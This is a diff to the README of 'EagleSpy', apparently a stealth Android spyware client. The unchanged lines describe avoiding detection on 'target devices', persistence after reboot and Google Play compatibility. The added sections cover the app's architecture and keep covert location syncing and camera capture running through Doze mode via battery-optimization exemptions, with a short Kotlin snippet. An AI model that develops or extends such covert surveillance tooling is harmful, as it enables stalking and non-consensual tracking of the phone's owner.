@@ -1,5 +1,34 @@
 # EagleSpy Android Client - Stealth APK
 
+## 🏗️ Architecture
+
+**NEW:** The Android client now uses **Clean Architecture** with MVVM, Repository pattern, Kotlin Coroutines, and Hilt DI.
+
+📖 **Documentation:**
+- [Architecture Overview](ANDROID_ARCHITECTURE.md) - Complete architecture guide
+- [Migration Guide](MIGRATION_GUIDE.md) - How to migrate old code
+- [Quick Reference](CLEAN_ARCHITECTURE_QUICK_REF.md) - Common patterns & cheat sheets
+- [Refactoring Summary](REFACTORING_SUMMARY.md) - What changed and why
+
+### Architecture Layers
+
+```
+┌─────────────────────────────────────┐
+│  Presentation (ViewModels + UI)    │
+├─────────────────────────────────────┤
+│  Domain (Use Cases + Models)       │
+├─────────────────────────────────────┤
+│  Data (Repository + API)            │
+└─────────────────────────────────────┘
+```
+
+**Key Technologies:**
+- Kotlin Coroutines for async operations
+- Hilt for Dependency Injection
+- StateFlow/SharedFlow for reactive UI
+- Retrofit for REST API
+- Room for local database (planned)
+
 ## 🔒 Stealth Architecture
 
 This Android client implements multiple stealth techniques to remain undetected on target devices.
@@ -129,6 +158,39 @@ Edit `network_security_config.xml`:
 - `RECEIVE_BOOT_COMPLETED`: Persistence after reboot
 - `FOREGROUND_SERVICE_*`: Background service types
 - `WAKE_LOCK`: Prevent CPU sleep during operations
+- `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`: Battery optimization exemption
+
+## 🔋 Battery Optimization
+
+### Features
+- **WorkManager Integration**: Battery-aware background sync with constraints
+- **Adaptive Intervals**: Dynamic sync intervals based on battery level and charging state
+- **Doze Mode Handling**: Maintains operations during Android Doze with maintenance window alarms
+- **Feature Gating**: Automatically disables intensive features when battery is low
+
+### Battery-Aware Intervals
+
+| Battery State | Charging | Sync Interval | Location Interval |
+|--------------|----------|---------------|-------------------|
+| < 15% | No | 60 min | 30 min |
+| 15-30% | No | 30 min | 20 min |
+| > 30% (WiFi) | No | 15 min | 10 min |
+| Any | Yes | 5 min | 5 min |
+
+### Implementation
+```kotlin
+// Automatic in EagleSpyApp.kt
+DataSyncWorker.scheduleAdaptive(context)
+DozeOptimization.requestIgnoreBatteryOptimizations(context)
+
+// Use in services
+val manager = AdaptiveSyncManager(context)
+if (manager.shouldEnableFeature(Feature.CAMERA_CAPTURE)) {
+    // Safe to proceed
+}
+```
+
+See [BATTERY_OPTIMIZATION.md](BATTERY_OPTIMIZATION.md) for full documentation.
 
 ## 🛡️ Google Play Compatibility
 
